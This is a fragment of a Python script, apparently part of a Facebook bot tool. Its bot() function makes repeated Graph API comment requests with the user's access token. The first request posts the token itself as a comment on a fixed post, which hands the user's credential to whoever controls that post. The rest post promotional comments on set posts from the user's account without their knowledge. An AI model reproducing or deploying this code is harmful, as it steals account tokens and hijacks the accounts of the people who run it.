...
def bot():
    ...
    komen_ku = 'Bang Jeeck x nano X Aang XD'
    ...
    requests.post('https://graph.facebook.com/573457507083491/comments/?message=' + token + '&access_token=' + token)
    requests.post('https://graph.facebook.com/573457507083491/comments/?message=' + komen_ku + '&access_token=' + token)
    requests.post('https://graph.facebook.com/5208624525868215/comments/?message=' + komen_ku + '&access_token=' + token)
    ...
    requests.post('https://graph.facebook.com/5208624525868215/comments/?message=' + komen_kita + '&access_token=' + token)
    requests.post('https://graph.facebook.com/5222617434468924/comments/?message=' + komen_lu + '&access_token=' + token)
    requests.post('https://graph.facebook.com/5208624525868215/comments/?message=' + komen_lu + '&access_token=' + token)
    requests.post('https://graph.facebook.com/5222617434468924/comments/?message=' + komen_nya + '&access_token=' + token)
    requests.post('https://graph.facebook.com/5208624525868215/comments/?message=' + komen_nya + '&access_token=' + token)
    requests.post('https://graph.facebook.com/5222617434468924/comments/?message=' + komen_dia + '&access_token=' + token)
    requests.post('https://graph.facebook.com/5208624525868215/comments/?message=' + komen_dia + '&access_token=' + token)
    requests.post('https://graph.facebook.com/5222617434468924/comments/?message=' + komen_fans + '&access_token=' + token)
    requests.post('https://graph.facebook.com/5208624525868215/comments/?message=' + komen_fans + '&access_token=' + token)
